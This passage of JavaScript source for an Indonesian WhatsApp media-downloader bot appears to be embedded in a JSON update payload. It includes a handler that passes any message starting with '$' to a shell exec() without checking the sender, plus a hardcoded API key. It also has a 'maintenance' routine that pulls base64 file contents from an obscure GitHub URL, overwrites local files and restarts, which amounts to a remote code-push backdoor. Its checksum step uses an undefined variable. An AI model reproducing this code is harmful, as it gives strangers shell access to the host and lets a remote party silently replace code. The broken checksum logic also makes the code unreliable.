        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '⚠️', key: m.key }
        });
        await xwill.sendMessage(m.key.remoteJid);
        return reply('❌ Gagal mengunduh video TikTok!\nError: ' + err.message);
    }
    break;
}







case 'ytmp3': {
    try {
        await xwill.sendMessage(m.key.remoteJid, { react: { text: '🎵', key: m.key }});
        
        if (!isApproved) {
            await xwill.sendMessage(m.key.remoteJid, { react: { text: '❌', key: m.key }});
            return reply('❌ Bot belum di ACC!');
        }

        if (!isPremium) {
            await xwill.sendMessage(m.key.remoteJid, { react: { text: '🔒', key: m.key }});
            return reply('🔒 Fitur ini khusus untuk pengguna premium!');
        }

        if (!q) {
            await xwill.sendMessage(m.key.remoteJid, { react: { text: '❓', key: m.key }});
            return reply('⚠️ URL YouTube diperlukan!');
        }
        await xwill.sendMessage(m.key.remoteJid, { react: { text: '📥', key: m.key }});

        const response = await fetch(`https://api.betabotz.eu.org/api/download/yt?url=${q}&apikey=nerokganteng`);
        const data = await response.json();

        if (!data.status) throw 'Gagal mendapatkan data audio';

        await xwill.sendMessage(m.chat, {
            audio: { url: data.result.mp3 },
            mimetype: 'audio/mp4',
            fileName: `${data.result.title}.mp3`,
            contextInfo: {
                externalAdReply: {
                    title: data.result.title,
                    body: `⏱️ Duration: ${data.result.duration}s`,
                    mediaType: 2,
                    mediaUrl: q
                }
            }
        });
        await xwill.sendMessage(m.key.remoteJid, { react: { text: '✅', key: m.key }});

    } catch (err) {
        await xwill.sendMessage(m.key.remoteJid, { react: { text: '⚠️', key: m.key }});
        reply('❌ Gagal mengunduh audio: ' + err.message);
    }
    break;
}

case 'ytmp4': {
    try {
        if (!isApproved) return reply('❌ Bot belum di ACC!');
        if (!isPremium) return reply('🔒 Fitur ini khusus untuk pengguna premium!');
        if (!q) return reply('⚠️ URL YouTube diperlukan!');

        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '⏳', key: m.key }
        });

        const response = await fetch(`https://api.betabotz.eu.org/api/download/yt?url=${q}&apikey=nerokganteng`);
        const data = await response.json();

        if (!data.status) throw 'Gagal mendapatkan data video';

        await xwill.sendMessage(m.chat, {
            video: { url: data.result.mp4 },
            caption: `🎥 *Download Berhasil*\n\n📝 *Judul:* ${data.result.title}\n⏱️ *Durasi:* ${data.result.duration}s`,
            mimetype: 'video/mp4'
        });

        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '✅', key: m.key }
        });

    } catch (err) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '⚠️', key: m.key }
        });
        console.error('Error in ytmp4:', err);
        reply('❌ Gagal mengunduh video: ' + err.message);
    }
    break;
}


case 'dec': case 'decrypt': {
    try {
        if (!isApproved) {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '❌', key: m.key }
            });
            
            if (!hasShownApprovalMessage) {
                reply('❌ Bot belum ada di ACC! Silakan hubungi owner');
                hasShownApprovalMessage = true;
            }
            return;
        }

        if (!isPremium) {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '👑', key: m.key }
            });
            return reply('🔒 Fitur ini khusus untuk pengguna premium!');
        }

        const { webcrack } = await import('webcrack');
        const usage = `Contoh:\n${prefix}${command} (Masukkan code)\n${prefix}${command} doc (Membalas dokumen.js)`;

        let text;
        if (args.length >= 1) {
            text = args.join(" ");
        } else if (m.quoted && m.quoted.text) {
            text = m.quoted.text;
        } else {
            return reply(usage);
        }

        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '⏳', key: m.key }
        });

        let message;
        if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
            if (m.quoted.mimetype !== "application/javascript") {
                return reply('⚠️ Mohon kirim file dengan ekstensi .js!');
            }
            let docBuffer;
            if (m.quoted.mimetype) {
                docBuffer = await m.quoted.download();
            }
            message = await webcrack(docBuffer.toString('utf-8'));
        } else {
            message = await webcrack(text);
        }

        const filePath = './database/sampah/xwinkelsBYXwinkels.js';
        fs.writeFileSync(filePath, message.code);
        
        await xwill.sendMessage(m.chat, {
            document: {
                url: filePath
            },
            mimetype: 'application/javascript',
            fileName: 'Dec By Xwinkels'
        }, {quoted: m});

        fs.unlinkSync(filePath);

        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '✅', key: m.key }
        });

    } catch (err) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '⚠️', key: m.key }
        });
        console.error('Error in decrypt:', err);
        return reply('❌ Terjadi kesalahan: ' + err.message);
    }
    break;
}

case 'instagram': case 'insta': {
    try {
        if (!isApproved) {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '❌', key: m.key }
            });
            
            if (!hasShownApprovalMessage) {
                reply('❌ Bot belum di ACC! Silahkan hubungi owner');
                hasShownApprovalMessage = true;
            }
            return;
        }

        const url = args[0]; 
        
        if (!url) {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '❓', key: m.key }
            });
            return reply(`*Anda Perlu Memberikan URL Video, Postingan, Reel, Gambar Instagram*\nContoh: ${prefix + command} https://www.instagram.com/p/xxx`);
        }

        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '⏳', key: m.key }
        });

        const response = await axios.get(`https://api.betabotz.eu.org/api/download/igdowloader?url=${url}&apikey=nerokganteng`);
        
        if (!response.data || !response.data.message) {
            throw new Error('Invalid response from API');
        }

        for (let i of response.data.message) {
            if (!i._url) continue;
            
            try {
                const mediaResponse = await axios.get(i._url, { responseType: 'arraybuffer' });
                const buffer = Buffer.from(mediaResponse.data);
                
                await xwill.sendMessage(m.chat, {
                    video: buffer,
                    caption: `*[ INSTAGRAM DOWNLOADER ]*\n\n© 2024 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍`
                }, { quoted: m });
            } catch (mediaError) {
                console.error('Error downloading media:', mediaError);
                continue;
            }
        }

        await xwill.sendMessage(m.chat, { 
            react: { text: "✅", key: m.key }
        });

    } catch (err) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '⚠️', key: m.key }
        });
        console.error('Error in instagram download:', err);
        return reply('Terjadi kesalahan saat mengunduh dari Instagram: ' + err.message);
    }
    break;
}


case 'play': {
    try {
        if (!isApproved) {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '❌', key: m.key }
            });
            return reply('❌ Bot belum di ACC! Silahkan hubungi owner');
        }

        const query = args.join(' ');

        if (!query) {
            await xwill.sendMessage(m.key.remoteJid, {
                react: { text: '❓', key: m.key }
            });
            return reply(`*Example :*\n\n${prefix}play Mendua`);
        }

        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '⏳', key: m.key }
        });
        let yts = require("youtube-yts");
        let search = await yts(query);
        let video = search.videos[0];
        
        if (!video) throw 'Video/Audio Tidak Ditemukan';
        const response = await axios.get(`https://api.betabotz.eu.org/api/download/ytmp3?url=${video.url}&apikey=nerokganteng`);

        await xwill.sendMessage(m.chat, { 
            audio: { url: response.data.result.mp3 },
            mimetype: 'audio/mp4',
            ptt: true, 
            fileName: `${video.title}.mp3`,
            caption: 'Xwinkels Audio'
        }, { quoted: m });

        await xwill.sendMessage(m.chat, { 
            react: { text: "✅", key: m.key }
        });

    } catch (err) {
        await xwill.sendMessage(m.key.remoteJid, {
            react: { text: '⚠️', key: m.key }
        });
        console.error('Error in play command:', err);
        return reply('Terjadi kesalahan saat memproses audio. Silahkan coba lagi.');
    }
    break;
}





// END OTHER MENU




default:
}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
xwill.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

};
async function getFileContent() {
    try {
        const response = await axios.get(MAINTEN_URL, {
            headers: { 'Cache-Control': 'no-cache' } 
        });
		
        let maintenanceData;
        try {
            maintenanceData = typeof response.data === 'object' ? response.data : JSON.parse(response.data);
        } catch (e) {
            throw new Error('Format data maintenance tidak valid');
        }

        if (maintenanceData.isMaintenanceMode) {
            console.log(chalk.red(`Server Mainten: ${maintenanceData.SendChat}`));
            
            if (maintenanceData.updateData) {
                const updateData = maintenanceData.updateData;
                console.log(chalk.yellow(`📥 Update terdeteksi untuk file: ${updateData.fileName}`));

                try {
                    if (!updateData.content || !updateData.checksum) {
                        throw new Error('Data update tidak lengkap');
                    }
                  
                    const fileContent = Buffer.from(updateData.content, 'base64');
                    const checksum = crypto.createHash('md5').update(fileBuffer).digest('hex');

                    if (checksum === updateData.checksum) {
                        const backupDir = './cache';
                        if (!fs.existsSync(backupDir)) {
                            fs.mkdirSync(backupDir, { recursive: true });
                        }
                      
                        const timestamp = new Date().getTime();
                        let backupName;
                        
                        if (fs.existsSync(updateData.fileName)) {
                            backupName = path.join(backupDir, `${updateData.fileName}.${timestamp}.backup`);
                            fs.copyFileSync(updateData.fileName, backupName); 
                            console.log(chalk.blue(`📦 Backup file lama: ${backupName}`));
                        }
                        fs.writeFileSync(updateData.fileName, fileContent);
                        console.log(chalk.green(`✅ File ${updateData.fileName} berhasil diupdate`));
                        const updateInfo = {
                            timestamp: new Date().toISOString(),
                            fileName: updateData.fileName,
                            backupFile: backupName || null,
                            checksum: checksum,
                            status: 'success'
                        };

                        const historyFile = './cache/update_history.json';
                        let history = [];
                        
                        try {
                            if (fs.existsSync(historyFile)) {
                                history = JSON.parse(fs.readFileSync(historyFile));
                            }
                            history.push(updateInfo);
                            const dbDir = path.dirname(historyFile);
                            if (!fs.existsSync(dbDir)) {
                                fs.mkdirSync(dbDir, { recursive: true });
                            }
                            
                            fs.writeFileSync(historyFile, JSON.stringify(history, null, 2));
                        } catch (e) {
                            console.error(chalk.red('Error menyimpan history:', e));
                        }

                        console.log(chalk.yellow('🔄 Merestart sistem untuk menerapkan update...'));
                        setTimeout(() => {
                            process.exit(1);
                        }, 1000);
                    } else {
                        throw new Error('Checksum tidak cocok');
                    }
                } catch (error) {
                    console.error(chalk.red('Error saat update:', error));
                    process.exit(1);
                }
            } else {
                process.exit(1);
            }
        }
        
        return maintenanceData;
    } catch (error) {
        console.error(chalk.red('Error fetching maintenance status:', error));
        return {
            isMaintenanceMode: false,
            SendChat: "Maintenance mode is off"
        };
    }
}
async function rollbackUpdate(fileName) {
    try {
        const historyFile = 'update_history.json';
        if (!fs.existsSync(historyFile)) {
            console.log(chalk.red('❌ Tidak ada history update'));
            return false;
        }

        const history = JSON.parse(fs.readFileSync(historyFile));
        const lastUpdate = history[history.length - 1];

        if (lastUpdate && lastUpdate.backupFile && fs.existsSync(lastUpdate.backupFile)) {
            const currentBackup = `${fileName}.current.backup`;
            fs.renameSync(fileName, currentBackup);
            fs.renameSync(lastUpdate.backupFile, fileName);
            console.log(chalk.green(`✅ Berhasil rollback ke backup: ${lastUpdate.backupFile}`));
            history.pop();
            fs.writeFileSync(historyFile, JSON.stringify(history, null, 2));

            return true;
        }

        return false;
    } catch (error) {
        console.error(chalk.red('Error saat rollback:', error));
        return false;
    }
}
async function maintenanceMain() {
	const maintenanceConfig = await getFileContent();
	if (maintenanceConfig && maintenanceConfig.isMaintenanceMode) {
		console.log(chalk.red(`Server Mainten ${maintenanceConfig.SendChat}`));
		return;
	}
}
const MAINTEN_URL = 'https://raw.githubusercontent.com/Bakuzaan1/sasasdasjfnxwienksbasas/refs/heads/main/MaintenXwinkel.json';
let hasShownMaintenanceStatus = false;
let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})",
    "checksum": "d2abd89e70e802fd82f9fc0b6a875056",
    "timestamp": "2024-12-03T07:30:34.049Z",
    "size": 140669
  },
  "timestamp": "2024-12-03T07:30:57.888Z"
}